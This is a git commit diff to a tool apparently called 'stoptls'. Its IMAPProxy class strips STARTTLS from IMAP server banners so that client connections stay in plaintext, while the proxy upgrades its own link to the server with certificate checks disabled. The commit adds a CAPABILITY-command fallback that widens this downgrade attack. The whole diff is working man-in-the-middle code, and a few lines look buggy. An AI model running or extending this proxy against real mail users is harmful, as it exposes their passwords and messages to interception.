720748177885abf061b141221ca6d0f72ad62a33
mathewmarcus <mathewmarcus456@gmail.com>
2018-11-10 21:32:18 -0600

    handle case where IMAP banner doesn't contain STARTTLS

--- stoptls/tcp/imap.py
+++ stoptls/tcp/imap.py
@@ -9,22 +9,23 @@ from stoptls.tcp import regex
 
 class IMAPProxy(TCPProxy):
     def __init__(self):
-        super().__init__(dst_port=143)
+        super().__init__()
 
     async def strip(self, client_reader, client_writer):
-        dst_address = self.get_orig_ip(client_reader)
+        dst_address, dst_port = self.get_orig_dst_socket(client_writer)
         logging.debug('Original destination: {}'.format(dst_address))
         server_reader, server_writer = await asyncio.open_connection(dst_address,
-                                                                     self.dst_port)
+                                                                     dst_port)
         banner = await server_reader.readline()
         logging.debug('Received banner: {}'.format(banner))
 
         banner = banner.decode('ascii')
         banner_re = regex.IMAP_RESPONSE.fullmatch(banner)
 
-        if banner_re.group('response') and \
+        if banner_re and \
+           banner_re.group('response') and \
            regex.STARTTLS.search(banner_re.group('response')):
-            banner = regex.STARTTLS.sub('', banner_re.group(0))
+            banner = regex.IMAP_STARTTLS.sub('', banner_re.group(0))
             server_writer.write(b'asdf STARTTLS\n')
             await server_writer.drain()
 
@@ -39,7 +40,7 @@ class IMAPProxy(TCPProxy):
 
                 nameinfo = await asyncio.get_running_loop()\
                                         .getnameinfo((dst_address,
-                                                      self.dst_port),
+                                                      dst_port),
                                                      socket.NI_NAMEREQD)
                 server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
                                                                              ssl=sc,
@@ -47,6 +48,43 @@ class IMAPProxy(TCPProxy):
                 logging.debug('Sucessfully upgraded to TLS!')
             else:
                 logging.debug('Failed to upgraded to TLS')
+        else:
+            # It's possible that STARTTLS, among other CAPABILITYs - wasn't
+            # included in the IMAP banner. In this case, we issue the
+            # CAPABILITY command. If STARTTLS is indeed a capability, then we
+            # upgrade the connection
+            server_writer.write(b'asdf CAPABILITY\n')
+            await server_writer.drain()
+
+            tls_supported = await server_reader.readline('\n')
+            logging.debug('Received data from server:{}').format(tls_supported)
+            tls_supported_re = regex.IMAP_RESPONSE.fullmatch(tls_supported.decode('ascii'))
+
+            if tls_supported_re and \
+               tls_supported_re.group('response') and \
+               regex.STARTTLS.search(tls_supported_re.group('response')):
+                server_writer.write(b'asdf STARTTLS\n')
+                await server_writer.drain()
+
+                tls_started = await server_reader.readline()
+                logging.debug('Received data from server: {}'.format(tls_started))
+                tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))
+
+                if tls_started_re and tls_started_re.group('ok'):
+                    sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+                    sc.check_hostname = False
+                    sc.verify_mode = ssl.CERT_NONE
+
+                    nameinfo = await asyncio.get_running_loop()\
+                                            .getnameinfo((dst_address,
+                                                          dst_port),
+                                                         socket.NI_NAMEREQD)
+                    server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
+                                                                                 ssl=sc,
+                                                                                 server_hostname=nameinfo[0])
+                    logging.debug('Sucessfully upgraded to TLS!')
+                else:
+                    logging.debug('Failed to upgraded to TLS')
 
         client_writer.write(banner.encode('ascii'))
         logging.debug('Writing banner to client...')
@@ -60,24 +98,6 @@ class IMAPProxy(TCPProxy):
                 logging.debug('Client closed connection')
                 break
 
-            client_data_re = regex.IMAP_COMMAND.fullmatch(client_data.decode('ascii'))
-
-            # Handle case where client attempts to upgrade to SSL/TLS
-            # If we reach this point, this means that we were unable to
-            # ugrade to TLS after the initial banner, either because
-            # the server didn't support it or because the upgrade process
-            # failed
-            if tls_started_re and \
-               tls_started_re.group('bad') and \
-               client_data_re and \
-               client_data_re.group('tag') and \
-               client_data_re.group('cmd').lower() == 'starttls':
-                response = '{} BAD error in IMAP command received by server'\
-                    .format(client_data_re.tag)
-                client_writer.write(response)
-                await client_writer.drain()
-                continue
-
             try:
                 server_writer.write(client_data)
                 logging.debug('Writing client data to server...')
@@ -89,11 +109,8 @@ class IMAPProxy(TCPProxy):
                 logging.debug('Reading from server...')
                 server_data = await server_reader.readline()
 
-                if server_reader.at_eof():
-                    logging.debug('Server closed connection')
-                    break
-
                 logging.debug('Received server data: {}'.format(server_data))
+
                 client_writer.write(server_data)
                 logging.debug('Writing server data to client...')
                 await client_writer.drain()
